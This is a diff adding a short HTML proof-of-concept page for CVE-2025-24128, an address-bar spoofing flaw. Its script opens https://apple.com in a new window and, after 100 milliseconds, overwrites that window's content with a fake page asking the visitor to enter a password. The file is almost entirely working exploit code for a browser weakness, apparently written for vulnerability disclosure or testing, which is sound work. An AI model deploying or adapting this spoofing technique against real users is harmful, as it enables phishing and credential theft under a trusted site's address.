@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC CVE-2025-24128</title>
+</head>
+<body>
+    <h1>Adress Bar spoofing poc</h1>
+    <button onclick="spoof()">start test</button>
+
+    <script>
+    function spoof() {
+        var win = window.open("https://apple.com", "_blank");
+
+        setTimeout(function() {
+            win.document.write("<h1>This is not the real apple.com. This is a hacked page! Enter your password.</h1>");
+            win.document.close();
+        }, 100); 
+    }
+    </script>
+</body>
+</html>
